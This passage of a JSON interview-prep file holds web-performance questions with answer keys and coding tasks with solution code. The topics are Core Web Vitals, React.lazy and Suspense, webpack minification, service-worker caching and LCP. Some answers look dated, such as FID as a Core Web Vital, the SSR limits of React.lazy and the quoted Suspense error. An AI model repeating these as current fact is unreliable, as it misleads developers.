          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_performance_metrics_7",
          "topic": "TTI (Time to Interactive)",
          "level": "medium",
          "type": "flashcard",
          "question": "What is the significance of TTI (Time to Interactive) in terms of user experience?",
          "answer": "TTI measures when the page is fully interactive, meaning the layout is stable, key web fonts are visible, and the main thread is idle enough to respond reliably to user input. Its significance lies in ensuring users can quickly and reliably interact with the page without experiencing frustrating delays or unresponsive UIs, leading to a much better user experience.",
          "analysisPoints": [
            "Definition of TTI (fully interactive).",
            "Direct link to user experience (responsiveness, no delays)."
          ],
          "keyConcepts": [
            "tti",
            "interactivity",
            "user-experience",
            "main-thread-idle"
          ],
          "evaluationCriteria": [
            "Understanding of TTI's importance for user interaction"
          ],
          "example": "",
          "tags": [
            "tti",
            "performance",
            "metrics",
            "interactivity"
          ],
          "prerequisites": [
            "javascript_execution"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_performance_metrics_8",
          "topic": "Metrics Comparison",
          "level": "hard",
          "type": "open",
          "question": "Distinguish between FCP (First Contentful Paint) and LCP (Largest Contentful Paint). Why are both important, even though LCP is a Core Web Vital?",
          "answer": "**FCP (First Contentful Paint)** measures when the *very first* piece of content (text, image, etc.) appears on the screen. It's the initial visual feedback that something is happening.\n\n**LCP (Largest Contentful Paint)** measures when the *largest content element* (typically a hero image or main heading) becomes visible within the viewport. This is often perceived by users as the main content loading.\n\nBoth are important because:\n-   **FCP** provides crucial early visual reassurance to the user that the page is loading and not broken. A quick FCP prevents users from abandoning the page prematurely.\n-   **LCP**, being a Core Web Vital, is a stronger indicator of perceived load speed of the *primary content*. It's critical for user satisfaction because it focuses on what matters most to the user on that specific page. Google uses LCP for SEO ranking, making it strategically important.\n\nWhile FCP indicates the start of rendering, LCP indicates that the main valuable content is ready, and both contribute to a holistic understanding of the page's loading experience.",
          "analysisPoints": [
            "Clear distinction between FCP and LCP.",
            "Explanation of what each measures and represents.",
            "Justification for the importance of both, including LCP's Core Web Vital status."
          ],
          "keyConcepts": [
            "fcp",
            "lcp",
            "core-web-vitals",
            "perceived-performance",
            "loading-performance",
            "seo"
          ],
          "evaluationCriteria": [
            "Ability to differentiate nuanced metrics.",
            "Understanding of their individual and combined importance.",
            "Knowledge of their impact on user experience and SEO."
          ],
          "example": "",
          "tags": [
            "performance",
            "metrics",
            "fcp",
            "lcp",
            "core-web-vitals"
          ],
          "prerequisites": [
            "web_rendering_pipeline"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_performance_metrics_9",
          "topic": "Metrics & Optimization",
          "level": "hard",
          "type": "open",
          "question": "For a React application, discuss how code splitting (using `React.lazy`) can positively impact FID and TTI. Are there any potential downsides?",
          "answer": "Code splitting using `React.lazy` can significantly improve FID and TTI in a React application:\n\n**Impact on FID (First Input Delay)**:\n-   By splitting the code into smaller, on-demand chunks, the initial JavaScript bundle size is reduced. This means the browser has less code to download, parse, and execute during the initial load.\n-   A smaller initial script means the main thread becomes idle sooner, as it spends less time processing the initial bundle. This allows it to respond to user interactions (like clicks or scrolls) much more quickly, thus lowering FID.\n\n**Impact on TTI (Time to Interactive)**:\n-   Similar to FID, a reduced initial JavaScript payload due to code splitting means the main thread is freed up earlier.\n-   The page reaches a state where it's reliably interactive faster because critical scripts are executed, and non-critical scripts are deferred, ensuring that the main thread is available to handle user input.\n\n**Potential Downsides**:\n-   **Increased Network Requests**: Instead of one large request, there might be multiple smaller requests for chunks. While parallelizable, this can introduce overhead if not managed well (e.g., too many small chunks).\n-   **Loading States/UX**: Introducing `Suspense` fallbacks means users might see 'Loading...' states as they navigate, which could be jarring if not handled smoothly.\n-   **Bundle Configuration Complexity**: Setting up optimal code splitting can be complex, especially with dynamic imports and ensuring correct chunking strategies in bundlers like Webpack.\n-   **SSR Limitations**: `React.lazy` and `Suspense` are primarily client-side. Implementing code splitting with Server-Side Rendering requires additional libraries or different approaches (e.g., `loadable-components`) to avoid hydration mismatches and ensure SEO friendliness.",
          "analysisPoints": [
            "Connect code splitting directly to reduced JS execution on the main thread.",
            "Explain how this impacts FID (responsiveness) and TTI (full interactivity).",
            "Identify and explain common downsides such as increased network requests, loading states, and SSR compatibility.",
            "Demonstrate a holistic understanding of the technique's pros and cons."
          ],
          "keyConcepts": [
            "code-splitting",
            "react.lazy",
            "suspense",
            "fid",
            "tti",
            "main-thread",
            "performance-tradeoffs",
            "ssr"
          ],
          "evaluationCriteria": [
            "Depth of technical understanding.",
            "Ability to analyze positive and negative impacts.",
            "Consideration of real-world implementation challenges."
          ],
          "example": "",
          "tags": [
            "performance",
            "react",
            "code-splitting",
            "fid",
            "tti",
            "optimization",
            "ssr"
          ],
          "prerequisites": [
            "react_performance",
            "javascript_execution_model"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_performance_metrics_10",
          "topic": "Core Web Vitals",
          "level": "medium",
          "type": "flashcard",
          "question": "Why are Core Web Vitals considered more important than other performance metrics for website owners?",
          "answer": "Core Web Vitals are considered more important because they are a standardized set of metrics directly reflecting real-world user experience across loading, interactivity, and visual stability. Crucially, Google uses them as part of its search ranking signals, meaning good Core Web Vitals can positively impact a site's SEO and visibility.",
          "analysisPoints": [
            "Standardized and user-centric.",
            "Direct link to Google SEO ranking.",
            "Reflects real-world user experience."
          ],
          "keyConcepts": [
            "core-web-vitals",
            "seo",
            "user-experience",
            "google-ranking"
          ],
          "evaluationCriteria": [
            "Understanding of strategic importance of Core Web Vitals"
          ],
          "example": "",
          "tags": [
            "core-web-vitals",
            "seo",
            "performance"
          ],
          "prerequisites": [],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_performance_metrics_11",
          "topic": "Frontend Performance Metrics",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following is an 'additional metric' and not part of the Core Web Vitals?",
          "answer": "TTFB (Time to First Byte)",
          "options": [
            "LCP (Largest Contentful Paint)",
            "FID (First Input Delay)",
            "TTFB (Time to First Byte)",
            "CLS (Cumulative Layout Shift)"
          ],
          "analysisPoints": [
            "Recall the specific three Core Web Vitals.",
            "Identify metrics outside of the Core Web Vitals set."
          ],
          "keyConcepts": [
            "core-web-vitals",
            "ttfb",
            "fcp",
            "tti"
          ],
          "evaluationCriteria": [
            "Ability to differentiate Core Web Vitals from other metrics"
          ],
          "example": "",
          "tags": [
            "performance",
            "metrics",
            "core-web-vitals"
          ],
          "prerequisites": [],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_optimization_techniques_1",
          "topic": "Code Splitting",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary benefit of implementing code splitting?",
          "answer": "It reduces the initial bundle size, leading to faster initial page load times and improved Time to Interactive, as the browser only downloads necessary code.",
          "analysisPoints": [
            "Reduced initial bundle size.",
            "Faster load times.",
            "On-demand loading."
          ],
          "keyConcepts": [
            "code-splitting",
            "bundle-size",
            "initial-load",
            "tti"
          ],
          "evaluationCriteria": [
            "Understanding the core benefit of code splitting"
          ],
          "example": "",
          "tags": [
            "code-splitting",
            "performance",
            "optimization"
          ],
          "prerequisites": [
            "javascript_bundlers"
          ],
          "complexity": 3,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_optimization_techniques_2",
          "topic": "React.lazy",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following React component:\n\n```typescript\nimport React, { Suspense, lazy } from 'react';\n\nconst MyLazyComponent = lazy(() => import('./MyLazyComponent'));\n\nfunction App() {\n  return (\n    <div>\n      <Suspense fallback={<div>Loading...</div>}>\n        {/* A */}\n        <MyLazyComponent />\n        {/* B */}\n      </Suspense>\n    </div>\n  );\n}\n```\n\nWhen will the code for `MyLazyComponent` be fetched?",
          "answer": "When `MyLazyComponent` is first rendered in the component tree at point A.",
          "options": [
            "When the `App` component is first imported.",
            "When the `App` component is first rendered, regardless of `MyLazyComponent`'s presence.",
            "When `MyLazyComponent` is first rendered in the component tree at point A.",
            "After the entire `App` component tree has finished mounting and is interactive."
          ],
          "analysisPoints": [
            "`React.lazy` loads components *when they are rendered*.",
            "It's not eager loading; it's on-demand.",
            "The `import()` call is part of the `lazy` function's argument and is executed upon rendering."
          ],
          "keyConcepts": [
            "react.lazy",
            "lazy-loading",
            "dynamic-import",
            "react-component-lifecycle"
          ],
          "evaluationCriteria": [
            "Understanding of `React.lazy`'s loading mechanism.",
            "Knowledge of when dynamic imports are triggered."
          ],
          "example": "The key is that `lazy` only *defines* the component; the actual `import()` call (and thus code fetching) happens only when React tries to render `MyLazyComponent` for the first time.",
          "tags": [
            "react",
            "lazy-loading",
            "code-splitting",
            "performance"
          ],
          "prerequisites": [
            "react_basics",
            "dynamic_imports"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_optimization_techniques_3",
          "topic": "React.lazy and Suspense",
          "level": "medium",
          "type": "open",
          "question": "What is the purpose of the `Suspense` component when using `React.lazy`, and what happens if you omit it?",
          "answer": "The purpose of the `Suspense` component when using `React.lazy` is to gracefully handle the asynchronous loading of a lazy-loaded component. It allows you to display a fallback UI (e.g., a loading spinner or message) while the component's code is being fetched and processed.\n\nIf you omit the `Suspense` component when rendering a `React.lazy` component, React will throw an error, typically something like \"A component suspended while responding to an event. This will not be supported in a future version of React. Wrap the suspended component in a `<Suspense>` boundary.\" This is because `React.lazy` components `suspend` their rendering until their code is loaded, and React requires a `Suspense` boundary to catch and manage this suspension.",
          "analysisPoints": [
            "Define Suspense's role (fallback UI, async handling).",
            "Explain the consequence of omitting Suspense (error).",
            "Mention the `fallback` prop."
          ],
          "keyConcepts": [
            "react.lazy",
            "suspense",
            "fallback-ui",
            "asynchronous-loading",
            "error-handling-react"
          ],
          "evaluationCriteria": [
            "Understanding of `Suspense`'s function.",
            "Knowledge of error handling without `Suspense`."
          ],
          "example": "",
          "tags": [
            "react",
            "suspense",
            "lazy-loading",
            "error-handling",
            "ux"
          ],
          "prerequisites": [
            "react_basics"
          ],
          "complexity": 6,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_optimization_techniques_4",
          "topic": "React.lazy Limitations",
          "level": "medium",
          "type": "flashcard",
          "question": "What is a significant limitation of `React.lazy` and `Suspense` regarding server-side rendering (SSR)?",
          "answer": "Currently, `React.lazy` and `Suspense` are primarily client-side features and are not directly supported for server-side rendering without additional workarounds or libraries like `loadable-components`.",
          "analysisPoints": [
            "Identify SSR as a limitation.",
            "Mention need for external solutions."
          ],
          "keyConcepts": [
            "react.lazy",
            "suspense",
            "ssr",
            "limitations"
          ],
          "evaluationCriteria": [
            "Knowledge of SSR compatibility issues with `React.lazy`"
          ],
          "example": "",
          "tags": [
            "react",
            "ssr",
            "lazy-loading",
            "limitations"
          ],
          "prerequisites": [
            "ssr_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_optimization_techniques_5",
          "topic": "Dynamic Imports",
          "level": "easy",
          "type": "flashcard",
          "question": "What kind of statement must the function passed to `React.lazy` call?",
          "answer": "A dynamic `import()` statement.",
          "analysisPoints": [
            "Recall the specific syntax requirement for `React.lazy`."
          ],
          "keyConcepts": [
            "react.lazy",
            "dynamic-import",
            "syntax"
          ],
          "evaluationCriteria": [
            "Basic recall of `React.lazy` syntax"
          ],
          "example": "```javascript\nconst MyComponent = React.lazy(() => import('./MyComponent'));\n```",
          "tags": [
            "react",
            "dynamic-imports",
            "lazy-loading"
          ],
          "prerequisites": [
            "es6_modules"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_optimization_techniques_6",
          "topic": "Code Splitting with React Router",
          "level": "medium",
          "type": "code",
          "question": "You have a React application using `react-router-dom` with routes for `/home`, `/about`, and `/dashboard`. You want to implement code splitting so that the `Dashboard` component is only loaded when the user navigates to `/dashboard`.\n\nComplete the `App` component below to achieve this using `React.lazy` and `Suspense`.\n\n```typescript\nimport { BrowserRouter as Router, Route, Routes } from 'react-router-dom';\nimport React, { Suspense, lazy } from 'react';\n\nconst Home = lazy(() => import('./routes/Home'));\nconst About = lazy(() => import('./routes/About'));\n// TODO: Create a lazy-loaded Dashboard component\n// const Dashboard = ...\n\nfunction App() {\n  return (\n    <Router>\n      {/* TODO: Add Suspense boundary */}\n        <Routes>\n          <Route path=\"/\" element={<Home />} />\n          <Route path=\"/about\" element={<About />} />\n          {/* TODO: Add Dashboard route */}\n        </Routes>\n      {/* TODO: Close Suspense boundary */}\n    </Router>\n  );\n}\n\nexport default App;\n```",
          "answer": "```typescript\nimport { BrowserRouter as Router, Route, Routes } from 'react-router-dom';\nimport React, { Suspense, lazy } from 'react';\n\nconst Home = lazy(() => import('./routes/Home'));\nconst About = lazy(() => import('./routes/About'));\nconst Dashboard = lazy(() => import('./routes/Dashboard'));\n\nfunction App() {\n  return (\n    <Router>\n      <Suspense fallback={<div>Loading Page...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<Home />} />\n          <Route path=\"/about\" element={<About />} />\n          <Route path=\"/dashboard\" element={<Dashboard />} />\n        </Routes>\n      </Suspense>\n    </Router>\n  );\n}\n\nexport default App;\n```",
          "analysisPoints": [
            "Correct use of `lazy` for the `Dashboard` component.",
            "Correct placement of the `Suspense` component wrapping the `Routes`.",
            "Correct `fallback` prop for `Suspense`.",
            "Proper use of `Route` element with the lazy component."
          ],
          "keyConcepts": [
            "react.lazy",
            "suspense",
            "react-router-dom",
            "code-splitting",
            "dynamic-imports"
          ],
          "evaluationCriteria": [
            "Ability to apply `React.lazy` and `Suspense` in a routing context.",
            "Correct React Router syntax for routes.",
            "Syntactic correctness and functionality."
          ],
          "example": "This solution correctly lazy-loads the `Dashboard` component, ensuring its code is only fetched when the user navigates to `/dashboard`. The `Suspense` boundary provides a smooth loading experience.",
          "tags": [
            "react",
            "react-router",
            "code-splitting",
            "lazy-loading",
            "coding-challenge"
          ],
          "prerequisites": [
            "react_basics",
            "react_router_basics"
          ],
          "complexity": 7,
          "interviewFrequency": 9,
          "learningPath": "intermediate"
        },
        {
          "id": "question_optimization_techniques_7",
          "topic": "Code Splitting vs. Minification/Gzip",
          "level": "hard",
          "type": "open",
          "question": "While bundle minification and Gzip compression reduce file size, how does code splitting offer a distinct advantage for initial page load performance that these two techniques cannot fully achieve?",
          "answer": "Minification and Gzip compression primarily reduce the *transfer size* of the entire JavaScript bundle. They make the network download faster, but the browser still has to download *all* of the code, and then parse, compile, and execute it.\n\n**Code splitting's distinct advantage**: It reduces the *logical size* (and thus the *processing load*) of the initial JavaScript bundle. Instead of downloading and processing the entire application, code splitting allows the browser to download only the necessary code for the current view or feature. This directly translates to:\n\n1.  **Faster Parsing/Compilation/Execution**: Less JavaScript needs to be processed upfront, freeing up the main thread sooner.\n2.  **Improved Time to Interactive (TTI) and First Input Delay (FID)**: The page becomes interactive much quicker because critical paths are unblocked faster.\n3.  **Reduced Memory Usage**: Less code in memory at any given time.\n\nEssentially, while minification and Gzip optimize *how much* you send, code splitting optimizes *what* you send initially, deferring non-critical assets until they are actually needed.",
          "analysisPoints": [
            "Clearly explain what minification/Gzip do (reduce transfer size).",
            "Explain what code splitting does (reduces logical size, defers loading).",
            "Highlight the difference in impact on browser processing (parsing, compilation, execution).",
            "Connect to specific metrics like TTI/FID."
          ],
          "keyConcepts": [
            "code-splitting",
            "minification",
            "gzip",
            "initial-load",
            "bundle-size",
            "tti",
            "fid",
            "browser-parsing"
          ],
          "evaluationCriteria": [
            "In-depth understanding of different optimization techniques.",
            "Ability to compare and contrast their unique benefits.",
            "Strong grasp of browser rendering and execution processes."
          ],
          "example": "",
          "tags": [
            "performance",
            "optimization",
            "code-splitting",
            "bundle-size",
            "browser-performance"
          ],
          "prerequisites": [
            "javascript_execution_model",
            "webpack_performance"
          ],
          "complexity": 8,
          "interviewFrequency": 9,
          "learningPath": "advanced"
        },
        {
          "id": "question_optimization_techniques_8",
          "topic": "Code Splitting vs. Tree Shaking",
          "level": "medium",
          "type": "mcq",
          "question": "Both 'code splitting' and 'tree shaking' are techniques to reduce the final bundle size. What is the fundamental difference in *how* they achieve this reduction?",
          "answer": "Code splitting divides the bundle into smaller, separate chunks loaded on demand, while tree shaking eliminates unused code from within a bundle.",
          "options": [
            "Code splitting only works for React applications, while tree shaking is universal.",
            "Code splitting is a runtime optimization, while tree shaking is a build-time optimization.",
            "Code splitting divides the bundle into smaller, separate chunks loaded on demand, while tree shaking eliminates unused code from within a bundle.",
            "Tree shaking compresses the code, while code splitting encrypts it."
          ],
          "analysisPoints": [
            "Code splitting is about breaking up the bundle into multiple files/chunks.",
            "Tree shaking is about removing dead code from *within* a file/chunk.",
            "Both are build-time optimizations, but they address different aspects of bundle size."
          ],
          "keyConcepts": [
            "code-splitting",
            "tree-shaking",
            "bundle-size",
            "optimization-techniques"
          ],
          "evaluationCriteria": [
            "Ability to differentiate between related but distinct optimization techniques.",
            "Understanding their mechanisms."
          ],
          "example": "Imagine a large book. Tree shaking is like removing blank pages or unused chapters from the book. Code splitting is like dividing the book into multiple smaller volumes, so you only need to carry the volume you're currently reading.",
          "tags": [
            "code-splitting",
            "tree-shaking",
            "optimization",
            "bundle-size"
          ],
          "prerequisites": [
            "javascript_bundlers"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_configure_webpack_optimization",
          "title": "Configure Webpack for Production Optimization (Minification & Gzip Simulation)",
          "description": "\nAs a frontend engineer, you're tasked with optimizing a simple React application for production. Your goal is to configure a Webpack build process to achieve bundle minification and simulate Gzip compression benefits by analyzing the build output.\n\n**Requirements:**\n1.  **Minify JavaScript**: Ensure that the output JavaScript bundle is minified.\n2.  **Minify CSS**: Ensure that any output CSS is minified.\n3.  **Analyze Bundle Size**: Use a Webpack bundle analyzer to visualize and confirm the size reduction after minification. You don't need to actually serve compressed files, but observe the reported gzipped size in the analysis.\n4.  **Entry Point**: The application has a single JavaScript entry point.\n\n**Note**: You don't need to write the React app itself, just focus on the `webpack.config.js` and the analysis.",
          "difficulty": "medium",
          "startingCode": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  mode: 'development', // Change this to 'production' later\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: path.resolve(__dirname, 'dist'),\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react'],\n          },\n        },\n      },\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader'],\n      },\n    ],\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './public/index.html',\n    }),\n  ],\n  // TODO: Add optimization specific for production\n};\n\n// src/index.js (example content)\n// import React from 'react';\n// import ReactDOM from 'react-dom/client';\n// const App = () => <h1>Hello Webpack!</h1>;\n// const root = ReactDOM.createRoot(document.getElementById('root'));\n// root.render(<App />);\n\n// public/index.html (example content)\n// <!DOCTYPE html>\n// <html>\n// <head><title>Webpack App</title></head>\n// <body><div id=\"root\"></div><script src=\"bundle.js\"></script></body>\n// </html>\n",
          "solutionCode": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\nconst CssMinimizerPlugin = require('css-minimizer-webpack-plugin');\nconst TerserPlugin = require('terser-webpack-plugin');\nconst BundleAnalyzerPlugin = require('webpack-bundle-analyzer').BundleAnalyzerPlugin;\n\nmodule.exports = {\n  mode: 'production', // Set mode to production for built-in optimizations\n  entry: './src/index.js',\n  output: {\n    filename: '[name].[contenthash].js', // Use contenthash for cache busting\n    path: path.resolve(__dirname, 'dist'),\n    clean: true, // Clean the dist folder before each build\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: 'babel-loader',\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react'],\n          },\n        },\n      },\n      {\n        test: /\\.css$/,\n        use: ['style-loader', 'css-loader'],\n      },\n    ],\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './public/index.html',\n    }),\n    new BundleAnalyzerPlugin({ analyzerMode: 'static', openAnalyzer: false }), // Generate a static report, don't open automatically\n  ],\n  optimization: {\n    minimize: true, // Enable minimization\n    minimizer: [\n      new TerserPlugin({ // For JavaScript minification (default in production mode, but explicit for clarity)\n        terserOptions: {\n          format: {\n            comments: false,\n          },\n        },\n        extractComments: false,\n      }),\n      new CssMinimizerPlugin(), // For CSS minification\n    ],\n    // You could also add splitChunks for code splitting, but not required by this task.\n  },\n};\n",
          "testCases": [
            "Run `webpack --mode production` to build the project.",
            "Verify `dist/` directory contains minified JS and CSS (if any CSS asset is added to project).",
            "Check that `bundle-analyzer-report.html` is generated in `dist/` and shows reduced sizes (including Gzip/Brotli estimations).",
            "Observe that the output JavaScript file has a content hash in its name (e.g., `main.f71b2a.js`)."
          ],
          "hints": [
            "Webpack's `mode: 'production'` enables many optimizations by default, including `TerserPlugin` for JS minification.",
            "For CSS minification, you'll need `css-minimizer-webpack-plugin`.",
            "The `webpack-bundle-analyzer` plugin is essential for visualizing bundle contents and sizes.",
            "Remember to install necessary plugins and loaders via npm/yarn."
          ],
          "tags": [
            "webpack",
            "optimization",
            "minification",
            "gzip",
            "deployment",
            "build-tools"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "webpack_basics",
            "npm_yarn_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "bundle_minification",
            "gzip_compression",
            "cache_optimizations"
          ]
        },
        {
          "id": "task_implement_service_worker_caching",
          "title": "Implement Basic Service Worker Caching for Offline Assets",
          "description": "\nYour goal is to enhance a simple static HTML/CSS/JS application by adding a basic Service Worker that caches essential assets, allowing the page to be loaded offline after the first visit.\n\n**Requirements:**\n1.  **Register Service Worker**: Register a service worker (`sw.js`) in `index.html`.\n2.  **Install Event**: In `sw.js`, listen for the `install` event and cache the `index.html`, `style.css`, and `script.js` files using the Cache Storage API.\n3.  **Activate Event**: In `sw.js`, listen for the `activate` event and clean up old caches (if any).\n4.  **Fetch Event**: In `sw.js`, intercept network requests via the `fetch` event. For cached assets, serve them from the cache first; otherwise, fetch from the network and then cache the response for future use (cache-first strategy).\n5.  **Test Offline**: Verify the application loads correctly when offline after an initial online visit.\n",
          "difficulty": "medium",
          "startingCode": "// index.html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Offline App</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <h1>Welcome to the Offline App!</h1>\n    <p>This content should be available offline.</p>\n    <button id=\"fetchBtn\">Fetch Data</button>\n    <div id=\"data\"></div>\n    <script src=\"script.js\"></script>\n    <script>\n        // TODO: Register service worker here\n    </script>\n</body>\n</html>\n\n// style.css\nbody {\n    font-family: sans-serif;\n    margin: 20px;\n    background-color: #f0f0f0;\n}\nh1 {\n    color: #333;\n}\n\n// script.js\ndocument.getElementById('fetchBtn').addEventListener('click', async () => {\n    const dataDiv = document.getElementById('data');\n    dataDiv.textContent = 'Fetching...';\n    try {\n        const response = await fetch('https://jsonplaceholder.typicode.com/todos/1');\n        const data = await response.json();\n        dataDiv.textContent = `Todo: ${data.title}`; \n    } catch (error) {\n        dataDiv.textContent = 'Failed to fetch data. Are you offline?';\n        console.error('Fetch error:', error);\n    }\n});\n",
          "solutionCode": "// index.html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Offline App</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <h1>Welcome to the Offline App!</h1>\n    <p>This content should be available offline.</p>\n    <button id=\"fetchBtn\">Fetch Data</button>\n    <div id=\"data\"></div>\n    <script src=\"script.js\"></script>\n    <script>\n        if ('serviceWorker' in navigator) {\n            window.addEventListener('load', () => {\n                navigator.serviceWorker.register('/sw.js')\n                    .then(registration => {\n                        console.log('Service Worker registered with scope:', registration.scope);\n                    })\n                    .catch(error => {\n                        console.error('Service Worker registration failed:', error);\n                    });\n            });\n        }\n    </script>\n</body>\n</html>\n\n// sw.js\nconst CACHE_NAME = 'my-pwa-cache-v1';\nconst urlsToCache = [\n  '/', // Catches index.html when accessed via root\n  '/index.html',\n  '/style.css',\n  '/script.js'\n];\n\nself.addEventListener('install', (event) => {\n  event.waitUntil(\n    caches.open(CACHE_NAME)\n      .then((cache) => {\n        console.log('Opened cache');\n        return cache.addAll(urlsToCache);\n      })\n  );\n});\n\nself.addEventListener('fetch', (event) => {\n  event.respondWith(\n    caches.match(event.request)\n      .then((response) => {\n        // Cache hit - return response\n        if (response) {\n          return response;\n        }\n        // No cache hit - fetch from network and cache for future\n        return fetch(event.request).then(\n          (response) => {\n            // Check if we received a valid response\n            if(!response || response.status !== 200 || response.type !== 'basic') {\n              return response;\n            }\n            // IMPORTANT: Clone the response. A response is a stream\n            // and can only be consumed once. We must clone it so that\n            // the browser can consume the original response and we can\n            // consume the clone. If the browser consumes the original response\n            // first, then we can't cache it.\n            const responseToCache = response.clone();\n\n            caches.open(CACHE_NAME)\n              .then((cache) => {\n                cache.put(event.request, responseToCache);\n              });\n\n            return response;\n          }\n        );\n      })\n    .catch(error => {\n        console.log('Fetch failed, returning cached page if available:', error);\n        // Optional: Serve a custom offline page if primary assets fail to load\n        // return caches.match('/offline.html');\n    })\n  );\n});\n\nself.addEventListener('activate', (event) => {\n  event.waitUntil(\n    caches.keys().then((cacheNames) => {\n      return Promise.all(\n        cacheNames.map((cacheName) => {\n          if (cacheName !== CACHE_NAME) {\n            console.log('Deleting old cache:', cacheName);\n            return caches.delete(cacheName);\n          }\n        })\n      );\n    })\n  );\n});\n",
          "testCases": [
            "Open `index.html` in a browser (e.g., via `http-server` or Live Server extension).",
            "Verify the Service Worker is registered in browser DevTools (Application tab -> Service Workers).",
            "Reload the page to ensure assets are cached.",
            "Go offline (e.g., turn off Wi-Fi or select 'Offline' in DevTools -> Network tab).",
            "Reload the page: It should still load correctly from the cache.",
            "Verify `fetchBtn` still attempts to fetch, but logs an error when offline, as that endpoint is not cached."
          ],
          "hints": [
            "Service Workers run in their own scope, usually at the root of your application (`/sw.js`).",
            "Use `event.waitUntil()` in `install` and `activate` events to ensure tasks are completed before the service worker is considered installed/activated.",
            "The `fetch` event listener is where you define your caching strategy. `caches.match()` checks the cache, and `caches.open().then(cache => cache.put())` adds to the cache.",
            "Remember to `clone()` responses before putting them into the cache, as responses are streams and can only be consumed once."
          ],
          "tags": [
            "service-worker",
            "pwa",
            "caching",
            "offline",
            "javascript",
            "browser-api"
          ],
          "timeEstimate": 90,
          "prerequisites": [
            "javascript_promises",
            "fetch_api",
            "html_css_js_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "service_workers",
            "cache_optimizations"
          ]
        },
        {
          "id": "task_analyze_and_improve_lcp",
          "title": "Analyze and Propose Improvements for LCP",
          "description": "\nYou are given a simple HTML page that simulates a common LCP issue: a large image that loads late. Your task is to analyze its LCP using browser developer tools and then propose and implement a solution to improve its LCP score.\n\n**Requirements:**\n1.  **Analyze LCP**: Open the `index.html` in Chrome DevTools (or similar), go to the `Performance` tab, and record a page load. Identify the LCP element and its LCP time.\n2.  **Propose Solution**: Based on your analysis, propose a specific technique to improve the LCP of the identified element.\n3.  **Implement Solution**: Modify the `index.html` to implement your chosen LCP optimization technique.\n4.  **Verify Improvement**: Re-run the performance analysis and compare the new LCP time with the old one, explaining the improvement.\n\n**Scenario**: The page has a large hero image that appears below some text but is critical to the perceived loading experience.",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>LCP Optimization</title>\n    <style>\n        body {\n            font-family: sans-serif;\n            margin: 0;\n            padding: 20px;\n            text-align: center;\n        }\n        .hero-section {\n            margin-top: 50px;\n        }\n        .hero-image {\n            width: 100%;\n            max-width: 800px;\n            height: auto;\n            display: block;\n            margin: 0 auto;\n            /* Simulate slow loading without a network throttle, or use a larger image */\n            /* For a real test, use a large image and network throttling in DevTools */\n        }\n    </style>\n</head>\n<body>\n    <h1>Welcome to Our Awesome Page!</h1>\n    <p>This is some introductory text to our amazing content. Please wait for the main image to load.</p>\n    <div class=\"hero-section\">\n        <img src=\"https://picsum.photos/id/237/1200/800\" alt=\"Large Hero Image\" class=\"hero-image\">\n    </div>\n    <p>More content will appear below the image.</p>\n</body>\n</html>\n",
